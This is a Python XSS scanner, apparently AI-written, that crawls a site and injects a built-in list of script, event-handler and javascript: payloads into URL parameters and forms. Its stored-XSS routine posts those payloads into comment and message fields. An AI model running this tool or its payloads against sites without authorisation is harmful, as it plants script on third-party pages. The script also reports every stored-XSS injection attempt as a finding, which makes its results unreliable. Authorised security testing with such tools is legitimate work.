#!/usr/bin/env python3

"""
XSS Scanning Script (Secondary Script)
Version: 1.0
Author: Gemini
Disclaimer: For educational use only. Run on systems you have explicit permission to test.
This script attempts to find Reflected and Stored XSS vulnerabilities.
DOM-based XSS detection is conceptual and limited without a headless browser.
"""

import os
import subprocess
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time
import re
import random
import logging
import sys

# Configure logging for the XSS script
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - [XSS] %(message)s',
                    handlers=[logging.StreamHandler()])

# --- Configuration ---
# Payloads for XSS detection. This list is illustrative; real scanners have hundreds.
XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "'\"><script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg/onload=alert(document.domain)>",
    "javascript:alert(document.domain)", # For href attributes
    "data:text/html,<script>alert(document.domain)</script>", # For data URIs
    "<body onload=alert(document.domain)>",
    "<iframe srcdoc=\"<script>alert(document.domain)</script>\"></iframe>",
    "</textarea><script>alert(document.domain)</script>", # For breaking out of textarea
    "<input type=\"text\" value=\"\"><script>alert(document.domain)</script>", # For breaking out of input value
    "<details open ontoggle=alert(document.domain)>", # HTML5 tag XSS
    "<marquee onstart=alert(document.domain)>",
    "<body onpageshow=alert(document.domain)>",
    "<link rel=dns-prefetch href=//xss.example.com>", # DNS prefetch (blind XSS indicator)
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(document.domain)\">",
    "<a href=\"javascript:alert(document.domain)\">Click Me</a>",
    # More advanced/encoded payloads would go here
    # e.g., URL encoded: %3cscript%3ealert(1)%3c/script%3e
    # HTML entity encoded: &lt;script&gt;alert(1)&lt;/script&gt;
]

# --- Global Variables for Scan State ---
visited_urls = set()
forms_to_test = [] # List of (url, form_details) tuples
urls_to_test_params = set() # Set of URLs with GET parameters
found_vulnerabilities = []
session = requests.Session() # Use a session to persist cookies

# --- UI Helpers for this script ---
def print_xss_info(message):
    logging.info(f"[XSS Info] {message}")
    print(f"\033[96m[XSS Info]\033[0m {message}") # Cyan

def print_xss_error(message):
    logging.error(f"[XSS Error] {message}")
    print(f"\033[91m[XSS Error]\033[0m {message}") # Red

def print_xss_success(message):
    logging.info(f"[XSS Success] {message}")
    print(f"\033[92m[XSS Success]\033[0m {message}") # Green

def print_xss_vuln(message):
    logging.critical(f"[XSS VULNERABILITY] {message}")
    print(f"\033[95m[XSS VULNERABILITY]\033[0m {message}") # Magenta

# --- Utility Functions ---

def get_absolute_url(base_url, relative_url):
    """Converts a relative URL to an absolute URL."""
    return urljoin(base_url, relative_url)

def is_same_domain(base_url, target_url):
    """Checks if two URLs belong to the same domain."""
    return urlparse(base_url).netloc == urlparse(target_url).netloc

def extract_links_and_forms(html_content, base_url):
    """Extracts all unique, same-domain links and form details from HTML content."""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Extract links
    new_links = set()
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        absolute_url = get_absolute_url(base_url, href)
        if is_same_domain(base_url, absolute_url):
            # Filter out mailto, tel, and other non-HTTP/HTTPS links
            if absolute_url.startswith('http://') or absolute_url.startswith('https://'):
                # Remove fragment identifiers for cleaner URLs
                parsed_abs_url = urlparse(absolute_url)
                clean_url = parsed_abs_url._replace(fragment="").geturl()
                new_links.add(clean_url)
    
    # Extract forms
    current_page_forms = []
    for form_tag in soup.find_all('form'):
        form_details = {}
        action = form_tag.get('action')
        form_details['action'] = get_absolute_url(base_url, action) if action else base_url
        form_details['method'] = form_tag.get('method', 'get').lower() # Default to GET
        form_details['inputs'] = []

        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text') # Default to text
            input_value = input_tag.get('value', '') # Default value

            if input_name: # Only consider inputs with a name
                form_details['inputs'].append({
                    'name': input_name,
                    'type': input_type,
                    'value': input_value
                })
        current_page_forms.append(form_details)
    
    return list(new_links), current_page_forms

def check_for_xss_reflection(response_text, payload):
    """
    Checks if the payload (or a recognizable part of it) is reflected in the response.
    This is a basic check and can be easily bypassed by filters.
    """
    # Look for the exact payload (case-insensitive)
    if re.search(re.escape(payload), response_text, re.IGNORECASE | re.DOTALL):
        return True
    
    # Look for common XSS patterns that indicate successful execution potential
    # This is still simplified and doesn't handle all encoding/obfuscation.
    if re.search(r"<script[^>]*>.*?alert\s*\(", response_text, re.IGNORECASE | re.DOTALL):
        return True
    if re.search(r"onerror\s*=\s*['\"]?alert\s*\(", response_text, re.IGNORECASE | re.DOTALL):
        return True
    if re.search(r"onload\s*=\s*['\"]?alert\s*\(", response_text, re.IGNORECASE | re.DOTALL):
        return True
    if re.search(r"javascript:alert\s*\(", response_text, re.IGNORECASE | re.DOTALL):
        return True
    
    return False

def report_xss_vulnerability(v_type, url, param_name, payload, method="GET", notes=""):
    """Adds a found vulnerability to the global list and prints it."""
    vuln_info = {
        "type": v_type,
        "url": url,
        "parameter": param_name,
        "payload": payload,
        "method": method,
        "notes": notes
    }
    found_vulnerabilities.append(vuln_info)
    print_xss_vuln(f"Type: {v_type}, URL: {url}, Param: {param_name}, Payload: {payload}, Method: {method}")
    if notes:
        print_xss_vuln(f"  Notes: {notes}")

# --- XSS Testing Functions ---

def test_reflected_xss_in_url_params(url):
    """Tests for reflected XSS in URL query parameters."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        return # No query parameters to test

    print_xss_info(f"Testing URL parameters for Reflected XSS: {url}")

    for param_name in query_params:
        for payload in XSS_PAYLOADS:
            # Create new query parameters with the payload injected
            test_params = query_params.copy()
            test_params[param_name] = payload
            encoded_test_params = urlencode(test_params, doseq=True) # doseq=True for multiple values per param

            test_url = parsed_url._replace(query=encoded_test_params).geturl()

            try:
                response = session.get(test_url, allow_redirects=True, timeout=5)
                if check_for_xss_reflection(response.text, payload):
                    report_xss_vulnerability("Reflected XSS", test_url, param_name, payload, "GET")
                time.sleep(random.uniform(0.1, 0.3)) # Be polite, add a small delay
            except requests.exceptions.RequestException as e:
                print_xss_error(f"Error testing {test_url}: {e}")
            except Exception as e:
                print_xss_error(f"An unexpected error occurred testing {test_url}: {e}")

def test_reflected_xss_in_forms(form_details):
    """Tests for reflected XSS in form input fields."""
    form_action = form_details['action']
    form_method = form_details['method']
    form_inputs = form_details['inputs']

    if not form_inputs:
        return # No inputs to test

    print_xss_info(f"Testing form for Reflected XSS: {form_action} (Method: {form_method.upper()})")

    for input_field in form_inputs:
        input_name = input_field['name']
        input_type = input_field['type']
        # input_value = input_field['value'] # Not strictly needed for injection

        # Skip file inputs as they require special handling and are not XSS vectors directly
        if input_type == 'file':
            continue

        for payload in XSS_PAYLOADS:
            test_data = {}
            # Populate all form fields, injecting payload into the current one
            for field in form_inputs:
                if field['name'] == input_name:
                    test_data[field['name']] = payload
                else:
                    # Use a dummy value for other fields, or their original value if available
                    test_data[field['name']] = "test_value" # field['value'] if field['value'] else "test_value"

            try:
                if form_method == 'post':
                    response = session.post(form_action, data=test_data, allow_redirects=True, timeout=5)
                else: # Default to GET
                    response = session.get(form_action, params=test_data, allow_redirects=True, timeout=5)

                if check_for_xss_reflection(response.text, payload):
                    report_xss_vulnerability("Reflected XSS", form_action, input_name, payload, form_method.upper())
                time.sleep(random.uniform(0.1, 0.3)) # Be polite, add a small delay
            except requests.exceptions.RequestException as e:
                print_xss_error(f"Error testing form {form_action}: {e}")
            except Exception as e:
                print_xss_error(f"An unexpected error occurred testing form {form_action}: {e}")

def test_stored_xss(url, form_details=None):
    """
    Conceptual approach for Stored XSS.
    This is highly dependent on the application's flow.
    A full implementation would require:
    1. Injecting a payload into a 'storable' field (e.g., comment, profile bio).
    2. Navigating to a page where that stored content would be rendered (e.g., comment display page, user profile).
    3. Checking the response of the rendering page for the payload.
    """
    print_xss_info(f"Conceptual Stored XSS testing for: {url}")
    
    # This is a placeholder. A real implementation needs to identify 'storable' inputs
    # and then check the *display* pages.
    # For demonstration, we'll try to inject into common 'comment' or 'message' fields.
    
    if form_details:
        storable_inputs = [
            inp for inp in form_details['inputs'] 
            if 'comment' in inp['name'].lower() or 'message' in inp['name'].lower() or 'body' in inp['name'].lower()
        ]
        
        if storable_inputs:
            print_xss_info(f"Attempting to inject stored XSS into storable form at {form_details['action']}")
            for input_field in storable_inputs:
                input_name = input_field['name']
                for payload in XSS_PAYLOADS:
                    test_data = {}
                    for field in form_details['inputs']:
                        if field['name'] == input_name:
                            test_data[field['name']] = payload
                        else:
                            test_data[field['name']] = "dummy_data" # Other fields need some value

                    try:
                        if form_details['method'] == 'post':
                            # Submit the payload
                            requests.post(form_details['action'], data=test_data, allow_redirects=True, timeout=5)
                        else:
                            requests.get(form_details['action'], params=test_data, allow_redirects=True, timeout=5)
                        
                        # After submission, you would typically need to navigate to the page
                        # where this content is displayed to check for reflection.
                        # For example, if it's a blog comment, you'd re-fetch the blog post URL.
                        # This part is highly application-specific and cannot be generalized easily.
                        # For now, we'll just report the injection attempt.
                        report_xss_vulnerability("Stored XSS (Injection Attempt)", form_details['action'], 
                                                 input_name, payload, form_details['method'].upper(),
                                                 "Manual verification needed on display pages.")
                        time.sleep(random.uniform(0.1, 0.3))
                    except requests.exceptions.RequestException as e:
                        print_xss_error(f"Error injecting stored XSS into form {form_details['action']}: {e}")
                    except Exception as e:
                        print_xss_error(f"An unexpected error occurred injecting stored XSS into form {form_details['action']}: {e}")
        else:
            print_xss_info("No obvious 'storable' input fields found in this form.")
    else:
        print_xss_info("No form details provided for stored XSS test on this URL.")


def test_dom_based_xss_conceptual():
    """
    Conceptual explanation for DOM-based XSS.
    This type of XSS requires a headless browser (like Selenium or Playwright)
    because the vulnerability lies in client-side JavaScript manipulating the DOM.
    A simple requests-based script cannot execute JavaScript.
    """
    print_xss_info("DOM-based XSS detection requires a headless browser (e.g., Selenium/Playwright).")
    print_xss_info("This requests-based script cannot detect it directly as it doesn't execute JavaScript.")
    print_xss_info("To detect DOM-based XSS, you would typically:")
    print_xss_info("1. Load the page in a headless browser.")
    print_xss_info("2. Inject payloads into URL fragments (#hash), or interact with JS-driven inputs.")
    print_xss_info("3. Use the browser's API to inspect the live DOM for injected script tags or executed payloads.")
    print_xss_info("4. Monitor console errors or network requests triggered by the payload.")

# --- Main XSS Scanner Logic ---

def run_xss_scan(target_url, output_directory):
    """Main function to orchestrate the XSS scan."""
    global visited_urls, forms_to_test, urls_to_test_params

    print_xss_info(f"Starting XSS scan for: {target_url}")
    print_xss_info(f"Using reconnaissance data from: {output_directory}")

    # 1. Load URLs from recon data (subdomains.txt, live.txt, interesting.txt)
    recon_urls = set()
    recon_urls.add(target_url) # Always include the main target

    live_file = os.path.join(output_directory, "live.txt")
    if os.path.exists(live_file) and os.path.getsize(live_file) > 0:
        try:
            with open(live_file, 'r') as f:
                for line in f:
                    # live.txt might contain URL, status, title. Extract just the URL.
                    url_match = re.match(r"^(https?://\S+)", line.strip())
                    if url_match:
                        recon_urls.add(url_match.group(1))
            print_xss_info(f"Loaded {len(recon_urls) - 1} live URLs from {live_file}.")
        except Exception as e:
            print_xss_error(f"Error reading live.txt: {e}")
    else:
        print_xss_info(f"No live.txt found or it's empty in {output_directory}. Will only scan main target.")

    wayback_file = os.path.join(output_directory, "wayback.txt")
    if os.path.exists(wayback_file) and os.path.getsize(wayback_file) > 0:
        try:
            with open(wayback_file, 'r') as f:
                for line in f:
                    # Only add if it's a valid HTTP/HTTPS URL and within the target domain
                    url = line.strip()
                    if (url.startswith('http://') or url.startswith('https://')) and is_same_domain(target_url, url):
                        parsed_url = urlparse(url)
                        # Only add URLs with query parameters for direct testing
                        if parsed_url.query:
                            recon_urls.add(url)
            print_xss_info(f"Added {len(recon_urls) - (len(recon_urls) - 1) -1} URLs with parameters from {wayback_file}.") # This count is tricky, just state it added some
        except Exception as e:
            print_xss_error(f"Error reading wayback.txt: {e}")
    else:
        print_xss_info(f"No wayback.txt found or it's empty in {output_directory}.")


    # 2. Start crawling and collecting forms/params for testing
    queue = list(recon_urls) # Start with collected URLs
    
    while queue:
        current_url = queue.pop(0)

        if current_url in visited_urls:
            continue

        print_xss_info(f"Crawling and analyzing: {current_url}")
        visited_urls.add(current_url)

        # Add URL to test_params if it has query parameters
        if urlparse(current_url).query:
            urls_to_test_params.add(current_url)

        try:
            response = session.get(current_url, timeout=10, allow_redirects=True)
            response.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)

            html_content = response.text

            # Extract new links and forms from the current page
            new_links, current_page_forms = extract_links_and_forms(html_content, current_url)
            
            for link in new_links:
                if link not in visited_urls and link not in queue:
                    queue.append(link) # Add to queue for further crawling

            for form in current_page_forms:
                # Store forms for later testing to avoid re-parsing
                forms_to_test.append(form)
            
            time.sleep(random.uniform(0.5, 1.0)) # Be polite, add a delay between page visits

        except requests.exceptions.RequestException as e:
            print_xss_error(f"Could not access {current_url} during crawling: {e}")
        except Exception as e:
            print_xss_error(f"An unexpected error occurred during crawling {current_url}: {e}")

    print_xss_success(f"Finished crawling. Found {len(urls_to_test_params)} URLs with parameters and {len(forms_to_test)} forms to test.")

    # 3. Execute XSS tests
    print_xss_info("\n--- Starting Reflected XSS Scan (URL Parameters) ---")
    for url in list(urls_to_test_params): # Convert to list to iterate safely
        test_reflected_xss_in_url_params(url)

    print_xss_info("\n--- Starting Reflected XSS Scan (Forms) ---")
    for form in forms_to_test:
        test_reflected_xss_in_forms(form)

    print_xss_info("\n--- Starting Stored XSS Scan (Conceptual) ---")
    # For stored XSS, we iterate through forms and attempt injection.
    # Actual detection would require re-visiting display pages.
    for form in forms_to_test:
        test_stored_xss(form['action'], form) # Pass the form action and full details

    print_xss_info("\n--- DOM-based XSS (Conceptual) ---")
    test_dom_based_xss_conceptual()

    # 4. Final Report
    print_xss_info("\n--- XSS Scan Complete ---")
    if found_vulnerabilities:
        print_xss_success(f"Found {len(found_vulnerabilities)} potential XSS vulnerabilities!")
        report_file_path = os.path.join(output_directory, "xss_findings.txt")
        with open(report_file_path, "w") as f:
            f.write(f"XSS Scan Report for {target_url}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for i, vuln in enumerate(found_vulnerabilities):
                f.write(f"--- Finding {i+1} ---\n")
                f.write(f"Type: {vuln['type']}\n")
                f.write(f"URL: {vuln['url']}\n")
                f.write(f"Parameter/Input: {vuln['parameter']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Method: {vuln['method']}\n")
                if vuln['notes']:
                    f.write(f"Notes: {vuln['notes']}\n")
                f.write("\n")
        print_xss_success(f"Detailed XSS findings saved to: {report_file_path}")
    else:
        print_xss_info("No XSS vulnerabilities found with the current payloads and detection methods.")
    
    print_xss_info("XSS scanning script finished.")


if __name__ == "__main__":
    import argparse
    from datetime import datetime # Import datetime here as well for direct use

    parser = argparse.ArgumentParser(description="Secondary XSS Scan Script")
    parser.add_argument("--output-dir", required=True, help="Path to the output directory from the main recon script")
    parser.add_argument("--target-url", required=True, help="The main target URL from the recon script")
    args = parser.parse_args()

    run_xss_scan(args.target_url, args.output_dir)
